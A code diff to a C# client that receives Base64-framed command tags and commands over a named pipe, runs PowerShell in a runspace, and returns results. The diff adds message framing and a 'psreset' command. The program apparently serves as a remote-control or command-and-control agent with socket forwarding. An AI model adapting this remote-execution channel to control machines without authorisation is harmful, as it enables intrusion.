@@ -20,6 +20,7 @@ namespace myclient
     class MyApp
     {
         private string t_message = "";
+        private string t_pipe_message = "";
         private Dictionary <Guid,Socket> fwSocket = new Dictionary<Guid, Socket>();
         private Dictionary <Guid,bool> fwSocket_alive = new Dictionary<Guid, bool>();
         private Dictionary <string, bool> rh_running = new Dictionary<string, bool>();
@@ -105,11 +106,7 @@ namespace myclient
                 {
 
                     Console.WriteLine("[DEBUG] t_message: " + t_message);
-                    Console.WriteLine("[DEBUG] Index of MsgTag_St: " + t_message.IndexOf(MsgTag_St));
-                    Console.WriteLine("[DEBUG] Index of MsgTag_Ed: " + t_message.IndexOf(MsgTag_Ed));
-                    Console.WriteLine("[DEBUG] MsgTag_St.Length: " + MsgTag_St.Length.ToString());
                     
-
                     int st_tag = t_message.IndexOf(MsgTag_St);
                     int ed_tag = t_message.IndexOf(MsgTag_Ed);
 
@@ -216,21 +213,50 @@ namespace myclient
             }//end of while
         }
         
-        private static byte[] ReadPipMessage(PipeStream pipe)
+        private string ReadPipMessage(PipeStream pipe)
         {
             byte[] buffer = new byte[1024];
+            string MsgTag_St = "[MYMSST]";
+            string MsgTag_Ed = "[MYMSED]";
+
             using (var ms = new MemoryStream())
             {
-                do
+
+                while (true)
                 {
-                    //Console.WriteLine("Into pipe read ...");
-                    var readBytes = pipe.Read(buffer, 0, buffer.Length);
-                    ms.Write(buffer, 0, readBytes);
+
+                    if (t_pipe_message.IndexOf(MsgTag_St) >= 0 && t_pipe_message.IndexOf(MsgTag_Ed) >= 0)
+                    {
+                        Console.WriteLine("[DEBUG] t_message: " + t_pipe_message);
+                        
+                        int st_tag = t_pipe_message.IndexOf(MsgTag_St);
+                        int ed_tag = t_pipe_message.IndexOf(MsgTag_Ed);
+
+                        var temp_var = ed_tag - (st_tag + MsgTag_St.Length);
+                        Console.WriteLine("[DEBUG] Length: " + temp_var.ToString());
+
+                        string r_msg = t_pipe_message.Substring(st_tag + MsgTag_St.Length, ed_tag - (st_tag + MsgTag_St.Length));
+                        t_pipe_message = t_pipe_message.Substring(ed_tag + MsgTag_Ed.Length);
+
+                        return Encoding.UTF8.GetString(Convert.FromBase64String(r_msg));
+                    }
+                    else
+                    {
+                        do
+                        {
+                            var readBytes = pipe.Read(buffer, 0, buffer.Length);
+                            ms.Write(buffer, 0, readBytes);
+
+                        }
+                        while (!pipe.IsMessageComplete);
+
+                        t_pipe_message = t_pipe_message + Encoding.UTF8.GetString(ms.ToArray());
+
+
+                    }
 
                 }
-                while (!pipe.IsMessageComplete);
-
-                return ms.ToArray();
+                
             }
         }
 
@@ -947,22 +973,19 @@ namespace myclient
             while (true)
             {
                 Console.WriteLine("[*] Waiting for pip message");
-                var messageBytes = ReadPipMessage(pipe);
-                command_tag = Encoding.UTF8.GetString(messageBytes);
+                command_tag = ReadPipMessage(pipe);
                 Console.WriteLine("[*] Tag Received: {0}", command_tag);
 
                 //ack
-                byte[] msg = Encoding.UTF8.GetBytes("COMMAND_TAG_SUCCESS");
+                byte[] msg = Encoding.UTF8.GetBytes(MsgPack("COMMAND_TAG_SUCCESS"));
                 pipe.Write(msg, 0, msg.Length);
                 Console.WriteLine("[*] Ack Sent..");
 
-
-                messageBytes = ReadPipMessage(pipe);
-                command = Encoding.UTF8.GetString(messageBytes);
+                command = ReadPipMessage(pipe);
                 Console.WriteLine("[*] CMD Received: {0}", command);
 
                 //ack
-                msg = Encoding.UTF8.GetBytes("COMMAND_SUCCESS");
+                msg = Encoding.UTF8.GetBytes(MsgPack("COMMAND_SUCCESS"));
                 pipe.Write(msg, 0, msg.Length);
                 Console.WriteLine("[*] Ack Sent..");
 
@@ -983,12 +1006,11 @@ namespace myclient
 
                     try
                     {
-                        msg = Encoding.UTF8.GetBytes(psresult);
+                        msg = Encoding.UTF8.GetBytes(MsgPack(psresult));
                         pipe.Write(msg, 0, msg.Length);
-                        messageBytes = ReadPipMessage(pipe);
 
                         //ack
-                        var psAck = Encoding.UTF8.GetString(messageBytes);
+                        var psAck = ReadPipMessage(pipe);
                         Console.WriteLine("[DEBUG] ACK msg: " + psAck);
                         if (psAck == "PSRUN_SUCCESS")
                         {
@@ -1009,6 +1031,17 @@ namespace myclient
 
 
                 }//end of if ps
+
+                if (command_tag.ToLower() == "psreset")
+                {
+                    myPsRun.cleanPsRun = RunspaceFactory.CreateRunspace(); //close it?
+                    myPsRun.init();
+                    Console.WriteLine("[DEBUG] psreset executed ...");
+                    msg = Encoding.UTF8.GetBytes(MsgPack("PSRESET_SUCCESS"));
+                    pipe.Write(msg, 0, msg.Length);
+                    Console.WriteLine("Send result finished");
+
+                }
 
 
 
